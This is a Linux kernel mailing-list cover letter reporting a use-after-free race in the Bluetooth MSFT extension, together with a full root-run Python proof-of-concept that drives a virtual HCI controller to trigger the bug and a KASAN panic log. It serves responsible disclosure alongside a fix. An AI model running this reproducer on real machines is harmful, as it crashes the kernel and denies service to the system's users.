Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 038A1369D5B
	for <linux-bluetooth@vger.kernel.org>; Fri,  7 Aug 2026 17:14:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.49
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786122895; cv=none; b=EIVYEXw0XMS7y8ZYfLvaKviOaEek+xKRz2OVXfysLd0leqPlWNLFnX4tWkBSD+knXneGB82oKiJOihQIzPUNS2Un7Y0cH5wrmzy9+2mER3uCPNtxZak9ZZYlrs/CLPfGz92v5fEdDRJxSbQMBMjrQ/y3CWKKOvFW030Qn36Zrao=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786122895; c=relaxed/simple;
	bh=JYxGlpUlmfqREsc3LMXyKmqsRWJddYBSaFzxw1ZBVMA=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=fjL26vEikaIgyLjpKQTNtRxXeoRLmlvUmGXmeY7hoWcfgESjHGxbB94UD7sGu7LwM+1GOkbkKpdnOvhwMtPU2dbRQj3DK0NSJvQYfPFK9FyDJujaQGmytYztkHU6tqZLR83/a1OyusodoUdrFABOOhRE5p/ibe40Pt1d3QOuBlA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=VJw9Z/7f; arc=none smtp.client-ip=209.85.216.49
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="VJw9Z/7f"
Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-3810c5d691bso3330265a91.1
        for <linux-bluetooth@vger.kernel.org>; Fri, 07 Aug 2026 10:14:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1786122893; x=1786727693; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=/Q6m3OMrEt51ELYI2pSG5NFONYhS5f8n4zAepuReBos=;
        b=VJw9Z/7fy5d1z2+melPGrLuxOOGJwedZuyfoLv9ZauBjJpdtz1qds0va3sv0xxAkbu
         m7JfF/outXOkhmaOGT6y59PqensuSxlgeqrjhHvAbI6loXpa2DoBSOmAXoXQD0BHnvkE
         X90169b/U6UZDD8SrVlJ+Pv93swB5ySEhjZZ4vw4h0asXh7c5CqyIntyc/pJdHCnK+9j
         bz4w5L3iY4RYp3+iZIhdGCVzLtV+e6Y+qWYwKUI9ccKe0H0j3eUprEROqKpqZNA9DSlB
         V7qaLR6rUyREbI7TWZoJTQILEO0yiHAqJLxLaCPtmAHxXUdz/hQE8rpkW9NKHaW+xK21
         Ykxw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786122893; x=1786727693;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=/Q6m3OMrEt51ELYI2pSG5NFONYhS5f8n4zAepuReBos=;
        b=EE1yihhH7YxPx7AQKOPQdUJfU4Ks0KpFUyPldlcx/ySml1ET9uQW9EjXeII8IGPeZt
         Slx3rRsklC8zHCEXH9qK7bLvSBsx+ZdsfCiD3VphTM5v+ZMmy+TtQrHbNpoP1zp7uOYf
         /WHniAyPqFd48egbpRB06mwvIjbUJtptwAV9pwYIW9QqXpJd6dFbCA2knusxb4c80S9j
         Q2CplWKOwt74YE10Io0joX5lk9ycQK1UEKYFi9X0mhdaeB8DX7b6jwl9KTMLG3t7as42
         v+8hbb+Av0w8Z5+FtUJRR+M0ZE5jZvb354X079o4nX30OS7w2wyEGOI9VzhMA57e2BaN
         rt7g==
X-Gm-Message-State: AOJu0Yx04jcgnoGtkYysWdOgk1TE2ym5RNRDWGXVqmcJrM6kLqGewmrj
	gNv1lcXHl5x3B5eNHeubihvCGw3SPRZGcffu5AaNTJioCZA2bUYlsFvllxaN2csu
X-Gm-Gg: AR+sD13gw6VOtHKLDWtSmLqJlBNsekxXQl2yFZAhkA9xF0c+NI1NKx1m77TVw2bnJrV
	p3CVLQMj5HGNOOWjPpQBsicLdGRLoFhG+qVfPMzPLvFrIJnw49qgy2uGqkR6PuBjWimhcRRKeTp
	p+WL1oTBRC6Sx4JQftmhVtvNWJ1kzqeRteevv9wPqAcijrnG0T1aiLpadDtssVmbXFhuHSHwLwx
	Rdh94/BUxYwhYFq79tLLS+dYzSxQedjR6wpcQ7O0ENc8CmYK6dFXT2EaoRwXvqewOLlT9ZVQ1gg
	yL7zlXga57o2biHGymok4IL3QdMx5mnOUEi5kXCq8Zqh++pky6BHx9Lb1JkmXhhRtFJmGM8h2jX
	NYb07/e6Py12VmsI6IcYSqE2fAsv1bLGB3svg98V/+BDkip/Jy5Ye2umKA6RRJWWVw36s40t0o7
	OA5wuTzxSKXd0HUExCMAsFtcwoX3Vbxboomnm78FNsuvsIQaOiE64VtIQm9RwCa6CXHmNnkmthV
	hqBWK9/q9+tCRE=
X-Received: by 2002:a17:90b:3985:b0:37c:18e0:90dc with SMTP id 98e67ed59e1d1-3903c5f41ccmr19311234a91.16.1786122893168;
        Fri, 07 Aug 2026 10:14:53 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-390b150ef29sm1646254a91.1.2026.08.07.10.14.45
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 07 Aug 2026 10:14:52 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-bluetooth@vger.kernel.org
Cc: marcel@holtmann.org,
	luiz.dentz@gmail.com,
	mcchou@chromium.org,
	mmandlik@google.com,
	alainm@chromium.org,
	abhishekpandit@chromium.org,
	apusaka@chromium.org,
	vega@nebusec.ai,
	edragain@163.com,
	enjou1224z@gmail.com
Subject: [PATCH RESEND 0/1] Bluetooth: msft: fix vendor event use-after-free during open
Date: Sat,  8 Aug 2026 01:14:44 +0800
Message-ID: <cover.1786092373.git.edragain@163.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Yong Wang <edragain@163.com>

Hi Linux kernel maintainers,

We found and validated a use-after-free in net/bluetooth/msft.c.
The bug is reachable by root on systems exposing /dev/vhci and the
Bluetooth debugfs controls. We tested the fix with the original
reproducer and verified that it no longer crashes the guest. We also
verified that the existing MSFT monitor functionality still works in
the same setup.

We provide the technical details and the reproducer below.

---- details below ----

Bug details:

Commit 5031ffcc79b8 ("Bluetooth: Keep MSFT ext info throughout a
hci_dev's life cycle") changed msft_do_open() to reuse the live
hdev->msft_data object across power cycles.

That makes msft_do_open() free and replace msft->evt_prefix while the
MSFT extension is already published through hdev->msft_data. On failure
it can also clear hdev->msft_data and free the whole msft object.

At the same time, msft_vendor_evt() reads hdev->msft_data and checks
msft->evt_prefix_len / msft->evt_prefix before taking hci_dev_lock().
Since HCI vendor events may still be processed while HCI_INIT is set,
vendor event handling can race with msft_do_open() and hit a use-after-
free on the old prefix buffer or the msft_data object itself.

We reproduced the bug with a vhci-based setup that emulates a LE-only
controller, enables the MSFT opcode through debugfs, seeds a large event
prefix, and then sprays vendor events across the LE Set Event Mask ->
msft_do_open() transition while repeatedly power-cycling the device.
The crash we observed was a KASAN slab-use-after-free in memcmp() from
msft_vendor_evt(), running on hci_rx_work.

The reproducer requires python3, /dev/vhci and Bluetooth debugfs.

Reproducer:

    cp poc.sh /root/poc.sh
    chmod +x /root/poc.sh
    ATTEMPTS=400 POC_TIMEOUT=180 /root/poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

if [ "$(id -u)" -ne 0 ]; then
	echo "run as root" >&2
	exit 1
fi

exec python3 - "$@" <<'PY'
import fcntl
import os
import select
import socket
import struct
import sys
import threading
import time

HCIDEVUP = 0x400448C9
HCIDEVDOWN = 0x400448CA
AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
BTPROTO_HCI = getattr(socket, "BTPROTO_HCI", 1)
HCI_COMMAND_PKT = 0x01
HCI_EVENT_PKT = 0x04
HCI_VENDOR_PKT = 0xFF
HCI_EV_CMD_COMPLETE = 0x0E

MSFT_OPCODE = 0xFC1E
PREFIX_A = b"A" * 241
PREFIX_B = b"B" * 241
ATTEMPTS = int(os.environ.get("ATTEMPTS", "400"))
RACE_THREADS = int(os.environ.get("RACE_THREADS", "2"))
TIMEOUT = float(os.environ.get("POC_TIMEOUT", "180"))

phase_lock = threading.Lock()
phase = "first_init"
attempt = 0
current_prefix = b""
next_prefix = PREFIX_A

first_done = threading.Event()
seed_done = threading.Event()
stop_evt = threading.Event()
spray_evt = threading.Event()

devid = None
vhci_fd = None


def get_state():
    with phase_lock:
        return phase, attempt, current_prefix, next_prefix


def set_phase(new_phase):
    global phase
    with phase_lock:
        phase = new_phase


def set_attempt(new_attempt):
    global attempt
    with phase_lock:
        attempt = new_attempt


def advance_prefix():
    global current_prefix, next_prefix
    with phase_lock:
        current_prefix = next_prefix
        next_prefix = PREFIX_B if next_prefix == PREFIX_A else PREFIX_A
        return current_prefix


def cmd_complete(opcode, params):
    payload = bytes([1]) + struct.pack("<H", opcode) + params
    return bytes([HCI_EVENT_PKT, HCI_EV_CMD_COMPLETE, len(payload)]) + payload


def status_rsp(opcode, status=0):
    return cmd_complete(opcode, bytes([status]))


def local_version_rsp():
    params = bytes([0x00, 0x09])
    params += struct.pack("<H", 0)
    params += bytes([0x09])
    params += struct.pack("<H", 0)
    params += struct.pack("<H", 0)
    return cmd_complete(0x1001, params)


def local_features_rsp():
    feats = bytearray(8)
    feats[4] = 0x60
    return cmd_complete(0x1003, b"\x00" + bytes(feats))


def local_commands_rsp():
    return cmd_complete(0x1002, b"\x00" + b"\x00" * 64)


def bdaddr_rsp():
    return cmd_complete(0x1009, b"\x00" + b"\x66\x55\x44\x33\x22\x11")


def le_local_features_rsp():
    return cmd_complete(0x2003, b"\x00" + b"\x00" * 8)


def le_buffer_size_rsp():
    return cmd_complete(0x2002, b"\x00" + struct.pack("<H", 0x001B) + b"\x01")


def le_supported_states_rsp():
    return cmd_complete(0x201C, b"\x00" + b"\x00" * 8)


def msft_supported_features_rsp(prefix):
    params = b"\x00\x00" + struct.pack("<Q", 0) + bytes([len(prefix)]) + prefix
    return cmd_complete(MSFT_OPCODE, params)


def vendor_evt_packet(prefix):
    payload = prefix + b"\x00"
    return bytes([HCI_EVENT_PKT, 0xFF, len(payload)]) + payload


def spray_worker(worker_id):
    sent = 0
    errs = 0

    while not stop_evt.is_set():
        if not spray_evt.is_set():
            time.sleep(0.0005)
            continue

        _, cur_attempt, prefix, _ = get_state()
        pkt = vendor_evt_packet(prefix)

        try:
            os.write(vhci_fd, pkt)
            sent += 1
        except OSError as exc:
            if exc.errno not in (6, 16, 19, 110, 111):
                errs += 1
                if errs < 10:
                    print(f"spray{worker_id}: errno={exc.errno} {exc}", flush=True)
            time.sleep(0.0001)

        if worker_id == 0 and sent and sent % 5000 == 0:
            print(f"spray attempt={cur_attempt} sent={sent}", flush=True)


def control_thread(sock):
    global devid

    if not first_done.wait(10):
        print("first init never completed", flush=True)
        stop_evt.set()
        return

    if stop_evt.is_set():
        return

    debugfs_path = f"/sys/kernel/debug/bluetooth/hci{devid}/msft_opcode"
    print(f"enabling msft opcode via {debugfs_path}", flush=True)
    with open(debugfs_path, "w", encoding="ascii") as handle:
        handle.write(f"{MSFT_OPCODE}\n")

    set_phase("seed_init")
    print("seed power-cycle", flush=True)
    fcntl.ioctl(sock.fileno(), HCIDEVDOWN, devid)
    fcntl.ioctl(sock.fileno(), HCIDEVUP, devid)
    print("seed cycle complete", flush=True)

    if not seed_done.wait(10):
        print("seed init never reached MSFT read", flush=True)
        stop_evt.set()
        return

    for idx in range(1, ATTEMPTS + 1):
        set_attempt(idx)
        set_phase("race_init")

        try:
            fcntl.ioctl(sock.fileno(), HCIDEVDOWN, devid)
            fcntl.ioctl(sock.fileno(), HCIDEVUP, devid)
        except OSError as exc:
            print(f"attempt {idx}: power-cycle failed: {exc}", flush=True)
            stop_evt.set()
            return

        spray_evt.clear()

        if idx % 10 == 0:
            print(f"completed attempts: {idx}", flush=True)

    print("no crash observed within configured attempts", flush=True)
    stop_evt.set()


def handle_command(opcode):
    cur_phase, cur_attempt, prefix, _ = get_state()

    if opcode == 0x0C03:
        os.write(vhci_fd, status_rsp(opcode))
    elif opcode == 0x1003:
        os.write(vhci_fd, local_features_rsp())
    elif opcode == 0x1001:
        os.write(vhci_fd, local_version_rsp())
    elif opcode == 0x1009:
        os.write(vhci_fd, bdaddr_rsp())
    elif opcode == 0x1002:
        os.write(vhci_fd, local_commands_rsp())
    elif opcode == 0x2003:
        os.write(vhci_fd, le_local_features_rsp())
    elif opcode == 0x2002:
        os.write(vhci_fd, le_buffer_size_rsp())
    elif opcode == 0x201C:
        os.write(vhci_fd, le_supported_states_rsp())
    elif opcode in (0x0C01, 0x2001):
        if cur_phase == "race_init" and opcode == 0x2001 and prefix:
            spray_evt.set()
        os.write(vhci_fd, status_rsp(opcode))
        if cur_phase == "first_init" and opcode == 0x2001:
            first_done.set()
    elif opcode == MSFT_OPCODE:
        new_prefix = advance_prefix()
        os.write(vhci_fd, msft_supported_features_rsp(new_prefix))
        if cur_phase == "seed_init":
            print(f"seeded prefix length {len(new_prefix)}", flush=True)
            seed_done.set()
        elif cur_phase == "race_init" and cur_attempt % 10 == 0:
            print(f"MSFT reply on attempt {cur_attempt}", flush=True)
    else:
        print(f"unexpected opcode 0x{opcode:04x} in phase {cur_phase}", flush=True)
        os.write(vhci_fd, status_rsp(opcode))


def main():
    global devid
    global vhci_fd

    vhci_fd = os.open("/dev/vhci", os.O_RDWR)
    os.write(vhci_fd, bytes([HCI_VENDOR_PKT, 0x00]))
    print("created vhci controller", flush=True)

    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)

    for worker_id in range(RACE_THREADS):
        thread = threading.Thread(target=spray_worker, args=(worker_id,), daemon=True)
        thread.start()

    thread = threading.Thread(target=control_thread, args=(sock,), daemon=True)
    thread.start()

    deadline = time.time() + TIMEOUT

    while time.time() < deadline and not stop_evt.is_set():
        ready, _, _ = select.select([vhci_fd], [], [], 1.0)
        if not ready:
            continue

        data = os.read(vhci_fd, 4096)
        if not data:
            print("vhci controller closed", flush=True)
            break

        pkt_type = data[0]

        if pkt_type == HCI_VENDOR_PKT and len(data) >= 4:
            _, opcode, lo, hi = data[:4]
            devid = lo | (hi << 8)
            print(f"hci{devid} created with create-opcode 0x{opcode:02x}", flush=True)
            continue

        if pkt_type != HCI_COMMAND_PKT or len(data) < 4:
            continue

        opcode = data[1] | (data[2] << 8)
        handle_command(opcode)

    stop_evt.set()
    spray_evt.clear()
    print("poc exited without crashing the guest", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
PY

------END poc.sh--------

----BEGIN crash log----

[  443.891897][ T5148] page_owner tracks the page as allocated
[  443.892364][ T5148] page last allocated via order 2, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 1, tgid 1 (swapper/0), ts 29935415922, free_ts 29929297499
[  443.894452][ T5148] page last free pid 1 tgid 1 stack trace:
[  443.895834][ T5148] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  443.896311][ T5148] CPU: 1 UID: 0 PID: 5148 Comm: kworker/u9:1 Not tainted 6.12.74 #3
[  443.896864][ T5148] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  443.897571][ T5148] Workqueue: hci0 hci_rx_work
[  443.897940][ T5148] Call Trace:
[  443.898179][ T5148]  <TASK>
[  443.898400][ T5148]  dump_stack_lvl+0x3b/0x1f0
[  443.898758][ T5148]  panic+0x6fe/0x7e0
[  443.899068][ T5148]  ? __pfx_panic+0x10/0x10
[  443.899402][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  443.899843][ T5148]  ? rcu_is_watching+0x12/0xc0
[  443.900223][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  443.900651][ T5148]  ? __pfx_lock_release+0x10/0x10
[  443.901054][ T5148]  ? check_panic_on_warn+0x24/0xb0
[  443.901434][ T5148]  ? memcmp+0x1bd/0x1d0
[  443.901762][ T5148]  check_panic_on_warn+0xb0/0xb0
[  443.902128][ T5148]  end_report+0x11b/0x180
[  443.902473][ T5148]  kasan_report+0xe8/0x110
[  443.902830][ T5148]  ? memcmp+0x1bd/0x1d0
[  443.903159][ T5148]  memcmp+0x1bd/0x1d0
[  443.903473][ T5148]  msft_vendor_evt+0x1e8/0x1a20
[  443.903854][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  443.904273][ T5148]  ? skb_pull_data+0x16b/0x210
[  443.904629][ T5148]  hci_event_packet+0xa05/0x11a0
[  443.905007][ T5148]  ? __pfx_msft_vendor_evt+0x10/0x10
[  443.905406][ T5148]  ? __pfx_hci_event_packet+0x10/0x10
[  443.905813][ T5148]  ? __entry_text_end+0x1020b5/0x1020b9
[  443.906230][ T5148]  ? mark_held_locks+0x94/0xe0
[  443.906592][ T5148]  ? kcov_remote_start+0x3af/0x6c0
[  443.907002][ T5148]  ? lockdep_hardirqs_on+0x7b/0x110
[  443.907381][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  443.907818][ T5148]  hci_rx_work+0x878/0x1680
[  443.908169][ T5148]  ? process_one_work+0x8d3/0x1b60
[  443.908561][ T5148]  process_one_work+0x96d/0x1b60
[  443.908957][ T5148]  ? __pfx_hci_rx_work+0x10/0x10
[  443.909334][ T5148]  ? __pfx_process_one_work+0x10/0x10
[  443.909744][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  443.910170][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  443.910585][ T5148]  ? assign_work+0x1a1/0x250
[  443.910949][ T5148]  worker_thread+0x647/0xe70
[  443.911311][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  443.911739][ T5148]  ? __kthread_parkme+0x137/0x210
[  443.912125][ T5148]  ? __pfx_worker_thread+0x10/0x10
[  443.912509][ T5148]  ? __pfx_worker_thread+0x10/0x10
[  443.912907][ T5148]  kthread+0x2b0/0x3a0
[  443.913209][ T5148]  ? _raw_spin_unlock_irq+0x28/0x50
[  443.913590][ T5148]  ? __pfx_kthread+0x10/0x10
[  443.913988][ T5148]  ret_from_fork+0x4a/0x80
[  443.914319][ T5148]  ? __pfx_kthread+0x10/0x10
[  443.914673][ T5148]  ret_from_fork_asm+0x1a/0x30
[  443.915060][ T5148]  </TASK>
[  443.915418][ T5148] Kernel Offset: disabled
[  443.915741][ T5148] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Yong Wang

Yong Wang (1):
  Bluetooth: msft: fix vendor event use-after-free during open

 net/bluetooth/msft.c | 70 +++++++++++++++++++++++++++-----------------
 1 file changed, 43 insertions(+), 27 deletions(-)

-- 
2.53.0
